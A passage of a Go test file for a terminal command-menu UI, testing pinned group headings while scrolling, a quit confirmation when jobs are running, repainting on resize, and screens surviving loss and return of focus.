		t.Errorf("the cut should fall between words, got %q", got)
	}
	p := newPicker([]item{{title: "A", header: true}, {title: "a1"}, {title: "G", header: true}, {title: "g1"}}, nil, false)
	p.cursor = 3
	if got := ansi.Strip(p.render(20, 1)); !strings.Contains(got, "g1") {
		t.Errorf("one row of room: it should show the cursor's row, got %q", got)
	}
}

func TestScrolledGroupKeepsItsHeading(t *testing.T) {
	var items []item
	for _, g := range []string{"Alpha", "Beta"} {
		items = append(items, item{title: g, header: true})
		for i := range 8 {
			items = append(items, item{title: fmt.Sprintf("%s %d", g, i)})
		}
	}
	p := newPicker(items, nil, false)
	for range 6 {
		p.move(1)
	}
	got := strings.Split(ansi.Strip(p.render(40, 4)), "\n")
	if len(got) != 4 || got[0] != "ALPHA" || !strings.Contains(got[3], "Alpha 6") {
		t.Fatalf("the heading should be pinned on top, the cursor's row last, got %q", got)
	}
	for range 6 { // well into Beta: its heading takes over
		p.move(1)
	}
	got = strings.Split(ansi.Strip(p.render(40, 4)), "\n")
	if len(got) != 4 || got[0] != "BETA" || !strings.Contains(got[3], "Beta 4") || strings.Contains(got[1], "Beta 0") {
		t.Fatalf("the next group's heading is pinned instead, got %q", got)
	}
	p.cursor, p.offset = 0, 0
	if got := ansi.Strip(p.render(40, 4)); strings.Count(got, "ALPHA") != 1 {
		t.Fatalf("at the top it's not doubled, got %q", got)
	}
}

func TestQuittingWithJobsAsksFirst(t *testing.T) {
	jobs := []string{"sleep"}
	m := New(Options{Config: &config.Config{}, Jobs: func() []string { return jobs }})
	esc, enter := tea.KeyPressMsg{Code: tea.KeyEscape}, tea.KeyPressMsg{Code: tea.KeyEnter}
	m.Update(esc)
	if m.mode != modeQuit || m.Quit {
		t.Fatalf("it should ask, got mode %v quit %v", m.mode, m.Quit)
	}
	if got := ansi.Strip(m.quitView(60)); !strings.Contains(got, "sleep") {
		t.Errorf("it should say what would end: %q", got)
	}
	m.Update(esc)
	if m.mode != modeBrowse || m.Quit {
		t.Fatal("a second esc goes back: a double-tap never quits")
	}
	m.Update(esc)
	m.Update(enter)
	if m.mode != modeBrowse || m.Quit {
		t.Fatal("no comes first, so enter stays")
	}
	m.Update(esc)
	m.Update(tea.KeyPressMsg{Code: tea.KeyDown})
	if _, cmd := m.Update(enter); !m.Quit || cmd == nil {
		t.Fatal("yes quits")
	}

	jobs = nil
	m = New(Options{Config: &config.Config{}, Jobs: func() []string { return jobs }})
	if m.Update(esc); !m.Quit {
		t.Fatal("with nothing running, esc quits straight away")
	}
}

// A resize repaints from clean: without it, one as the window opens left rows
// drawn over each other once the list scrolled.
func TestResizeRepaintsFromClean(t *testing.T) {
	m := New(Options{Config: &config.Config{}})
	_, cmd := m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	if cmd == nil {
		t.Fatal("a resize asked for no repaint")
	}
	if got, want := fmt.Sprintf("%T", cmd()), fmt.Sprintf("%T", tea.ClearScreen()); got != want {
		t.Errorf("a resize sent %s, want %s", got, want)
	}
}

// A shell still reading its rc file locks the menu but doesn't say so: its
// subprocesses come and go too fast to read.
func TestStartingShellLocksQuietly(t *testing.T) {
	st := ShellState{Busy: "brew", Starting: true}
	m := New(Options{Config: &config.Config{}, Shell: func() ShellState { return st }})
	m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
	m.readShell()
	if m.blocked() == "" {
		t.Error("the menu should still hold commands back")
	}
	if bar := ansi.Strip(m.statusBar(60)); strings.Contains(bar, "is running") {
		t.Errorf("the band should wait for the first prompt, got %q", bar)
	}
	st = ShellState{}
	m.readShell()
	st = ShellState{Busy: "sleep"}
	m.readShell()
	if bar := ansi.Strip(m.statusBar(60)); !strings.Contains(bar, "sleep is running") {
		t.Errorf("after the first prompt the band should say so, got %q", bar)
	}
}

// Leaving for the shell and coming back, by focus event or by key, works on
// every screen: refocusing an input that screen never made used to panic,
// which took the whole session and its window with it.
func TestLeavingAndComingBackOnEveryScreen(t *testing.T) {
	text := []config.Arg{{Name: "name", Prompt: "name", Desc: "d"}}
	picks := []config.Arg{{Name: "name", Desc: "d", Options: []config.Option{{Value: "a"}, {Value: "b"}}}}
	for _, c := range []struct {
		name string
		cmd  config.Command
		keys []tea.KeyPressMsg
		mode mode
	}{
		{"typing", config.Command{Name: "C", Cmd: "x <name>", Args: text}, nil, modeFill},
		{"picking", config.Command{Name: "C", Cmd: "x <name>", Args: picks}, nil, modeFill},
		{"y/N", config.Command{Name: "C", Cmd: "x", Risk: config.RiskWarn}, nil, modeConfirm},
		{"y/N after typing", config.Command{Name: "C", Cmd: "x <name>", Args: text, Risk: config.RiskWarn}, []tea.KeyPressMsg{typed("v"), {Code: tea.KeyEnter}}, modeConfirm},
		{"danger code", config.Command{Name: "C", Cmd: "x", Risk: config.RiskDanger}, nil, modeConfirm},
	} {
		for _, back := range []struct {
			name string
			msg  tea.Msg
		}{{"focus", tea.FocusMsg{}}, {"key", typed("z")}} {
			t.Run(c.name+"/"+back.name, func(t *testing.T) {
				sec := config.Section{Name: "S", Icon: "•", Category: config.Other, Commands: []config.Command{c.cmd}}
				m := New(Options{Config: &config.Config{Sections: []config.Section{sec}},
					Send: func(string) error { return nil }})
				m.Update(tea.WindowSizeMsg{Width: 60, Height: 40})
				m.showSection(&m.opt.Config.Sections[0])
				m.Update(tea.KeyPressMsg{Code: tea.KeyEnter})
				for _, k := range c.keys {
					m.Update(k)
				}
				if m.mode != c.mode {
					t.Fatalf("mode %d, want %d", m.mode, c.mode)
				}
				m.Update(tea.BlurMsg{})
				_ = m.View()
				m.Update(back.msg)
				_ = m.View()
				if m.mode != c.mode || m.Quit {
					t.Errorf("coming back moved on: mode %d, quit %v", m.mode, m.Quit)
				}
				for _, in := range m.inputs() {
					if !in.Focused() {
						t.Error("an input on screen is still blurred")
					}
				}
			})
		}
	}
}
